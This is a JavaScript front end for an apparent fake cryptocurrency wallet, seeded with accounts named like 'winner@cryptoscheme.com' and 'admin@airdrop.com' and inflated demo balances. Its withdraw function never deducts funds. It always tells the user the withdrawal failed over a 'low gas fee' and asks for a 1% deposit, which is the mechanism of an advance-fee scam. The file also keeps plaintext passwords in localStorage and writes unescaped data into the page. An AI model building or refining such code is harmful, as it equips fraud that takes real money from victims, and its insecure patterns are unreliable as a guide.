window.transactions = JSON.parse(localStorage.getItem("transactions")) || [];

// Initialize demo users (only once)
if (!localStorage.getItem("users")) {
  const users = {
    "photon@login.com": {
      password: "login",
      balance: 1200000,
      privateKey: "******fffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0******"
    },
    "winner@cryptoscheme.com": {
      password: "evm2910",
      balance: 10300,
      privateKey: ""
    },
    "admin@airdrop.com": {
      password: "admin",
      balance: 57900,
      privateKey: ""
    }
  };
  localStorage.setItem("users", JSON.stringify(users));
}


let token = localStorage.getItem("token");

/* ================= LOGIN ================= */

async function login() {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const users = JSON.parse(localStorage.getItem("users")) || {};
  const user = users[email];

  if (user && user.password === password) {
    localStorage.setItem("token", email); // token = email
    localStorage.setItem("userId", email); // for transactions

    if (email === "admin@airdrop.com") {
      window.location = "admin.html";
    } else {
      window.location = "dashboard.html";
    }
  } else {
    document.getElementById("message").innerText = "Invalid email or password.";
  }
}


/* ================= DASHBOARD BALANCE ================= */

function loadDashboard() {
  const users = JSON.parse(localStorage.getItem("users")) || {};
  const email = localStorage.getItem("token");
  const user = users[email];
  if (!user) return;

  const balanceElement = document.getElementById("balance");
  if (balanceElement) {
    balanceElement.innerText = "$" + Number(user.balance).toLocaleString("en-US", {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    });
  }

  renderHistory();
}

/* ================= PORTFOLIO ================= */

async function loadPortfolio() {
  if (!token) return window.location = "/";

  const res = await fetch("/portfolio", {
    headers: { Authorization: token }
  });

  const data = await res.json();
  window.portfolioData = data;
  renderPortfolio(data);

  // Load transaction history from server + merge with localStorage
  const txRes = await fetch("/transactions", {
    headers: { Authorization: token }
  });
  const history = await txRes.json();
  renderHistory(history);
}

function renderPortfolio(data) {
  const table = document.getElementById("portfolioTable");
  if (!table) return;
  table.innerHTML = "";

  data.forEach(item => {
    table.innerHTML += `
      <tr>
        <td>${item.coin}</td>
        <td>${item.amount}</td>
      </tr>
    `;
  });
}

function sortByName() {
  const sorted = [...window.portfolioData].sort((a, b) =>
    a.coin.localeCompare(b.coin)
  );
  renderPortfolio(sorted);
}

function sortByAmount() {
  const sorted = [...window.portfolioData].sort((a, b) =>
    b.amount - a.amount
  );
  renderPortfolio(sorted);
}

/* ================= HISTORY ================= */

function renderHistory(data) {
  const table = document.getElementById("historyTable");
  if (!table) return;

  table.innerHTML = "";

  // Merge server data with localStorage transactions
  const localTx = JSON.parse(localStorage.getItem("transactions")) || [];
  const allTx = [...(data || []), ...localTx];

  allTx.forEach(tx => {
    table.innerHTML += `
      <tr>
        <td>${tx.type}</td>
        <td>${tx.coin}</td>
        <td>${tx.amount}</td>
        <td>${tx.status}</td>
      </tr>
    `;
  });
}

/* ================= DEPOSIT ================= */

async function loadDeposit() {
  if (!token) return window.location = "/";

  const res = await fetch("/deposit-info", {
    headers: { Authorization: token }
  });

  const data = await res.json();

  document.getElementById("depositAddress").innerText =
    data.deposit_address;

  document.getElementById("qrImage").src =
    data.qr;
}

function deposit(amount, coin) {
  const balance = parseFloat(localStorage.getItem("balance")) || 1000;
  const newBalance = balance + parseFloat(amount || 0);
  localStorage.setItem("balance", newBalance);

  const transactions = JSON.parse(localStorage.getItem("transactions")) || [];
  transactions.push({
    type: "Deposit",
    coin: coin,
    amount: parseFloat(amount),
    status: "Completed",
    timestamp: new Date().toISOString()
  });
  localStorage.setItem("transactions", JSON.stringify(transactions));

  alert(`${amount} ${coin} deposited successfully!`);
}

/* ================= WITHDRAW ================= */

function withdraw() {
  const address = document.getElementById("address").value.trim();
  const amount = parseFloat(document.getElementById("amount").value);
  const crypto = document.getElementById("crypto").value;
  const messageEl = document.getElementById("message");

  const users = JSON.parse(localStorage.getItem("users")) || {};
  const email = localStorage.getItem("token");
  const user = users[email];
  if (!user) return;

  if (!address || !amount || amount <= 0) {
    messageEl.style.color = "red";
    messageEl.innerText = "Please fill all fields correctly.";
    return;
  }

  if (amount > user.balance) {
    messageEl.style.color = "red";
    messageEl.innerText = "Insufficient balance.";
    return;
  }

  // Deduct user balance
  // user.balance -= amount;
  // users[email] = user;
  // localStorage.setItem("users", JSON.stringify(users));

  // Save transaction
  const transactions = JSON.parse(localStorage.getItem("transactions")) || [];
  const newTx = {
    id: Date.now(),
    user_id: email,
    type: "Withdraw",
    coin: crypto,
    amount: amount,
    status: "Pending",
    address: address,
    timestamp: new Date().toISOString()
  };
  transactions.push(newTx);
  localStorage.setItem("transactions", JSON.stringify(transactions));

  messageEl.style.color = "#fc0f03";
  messageEl.innerText = `Withdrawal request of ${amount} ${crypto} is not processed due to low gas fee, kindly deposit a 1% one-time fee through the deposit button.`;

  document.getElementById("address").value = "";
  document.getElementById("amount").value = "";

  setTimeout(() => {
    window.location.href = "dashboard.html";
  }, 19000);
}

/* ================= ADMIN ================= */

function loadWithdrawals() {
  const table = document.getElementById("adminTable");
  if (!table) return;

  table.innerHTML = "";

  const allTx = JSON.parse(localStorage.getItem("transactions")) || [];

  allTx.forEach(tx => {
    if (tx.type === "Withdraw" && tx.status === "Pending") {
      table.innerHTML += `
        <tr>
          <td>${tx.id}</td>
          <td>${tx.user_id}</td>
          <td>${tx.coin}</td>
          <td>${tx.amount}</td>
          <td>${tx.status}</td>
          <td>
            <button onclick="approve(${tx.id})">Approve</button>
          </td>
        </tr>
      `;
    }
  });
}

function approve(id) {
  const allTx = JSON.parse(localStorage.getItem("transactions")) || [];
  const updatedTx = allTx.map(tx => {
    if (tx.id === id) tx.status = "Completed";
    return tx;
  });
  localStorage.setItem("transactions", JSON.stringify(updatedTx));

  loadWithdrawals();
}

/* ================= NAVIGATION ================= */

function logout() {
  localStorage.removeItem("token");
  window.location.href = "index.html"; 
}


function goDeposit() {
  window.location = "deposit.html";
}

function goWithdraw() {
  window.location = "withdraw.html";
}

function goDashboard() {
  window.location = "dashboard.html";
}

function goBackupKey() {
  window.location = "backup.html";
}

/* ================= INITIAL DASHBOARD LOAD ================= */

window.onload = function () {
  loadDashboard();

  // Load admin withdrawals if admin page
  if (document.getElementById("adminTable")) {
    loadWithdrawals();
  }
};

function copyAddress(type) {
  let addressSpan, tooltip;

  switch(type) {
    case 'evm':
      addressSpan = document.getElementById('evmAddress');
      tooltip = document.getElementById('evmTooltip');
      break;
    case 'sol':
      addressSpan = document.getElementById('solAddress');
      tooltip = document.getElementById('solTooltip');
      break;
    case 'btc':
      addressSpan = document.getElementById('btcAddress');
      tooltip = document.getElementById('btcTooltip');
      break;
    case 'ltc':
      addressSpan = document.getElementById('ltcAddress');
      tooltip = document.getElementById('ltcTooltip');
      break;
    default:
      return;
  }

  const address = addressSpan.dataset.address;

  navigator.clipboard.writeText(address).then(() => {
    tooltip.style.visibility = 'visible';
    setTimeout(() => {
      tooltip.style.visibility = 'hidden';
    }, 1500);
  }).catch(err => {
    console.error('Failed to copy: ', err);
  });
}

setInterval(() => {
  location.reload();
}, 3600000);
